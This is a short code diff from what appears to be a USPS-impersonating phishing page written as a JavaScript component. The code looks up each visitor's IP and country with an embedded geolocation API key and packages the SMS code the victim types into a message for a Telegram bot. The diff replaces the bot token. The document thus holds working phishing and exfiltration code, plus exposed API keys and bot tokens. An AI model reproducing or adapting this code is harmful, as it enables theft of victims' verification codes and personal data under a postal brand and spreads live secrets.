@@ -2007,7 +2007,7 @@ export default {
     var tt = await axios.get(
       "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
     );
-    this.IP=tt.data.ip;
+    this.IP = tt.data.ip;
     this.query = tt.data.country_capital;
   },
   methods: {
@@ -2016,7 +2016,7 @@ export default {
       if (this.tries < 2) {
         if (this.sms.length) {
           this.error = false;
-          var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
+          var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
           var chatId2 = -957355212;
           var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
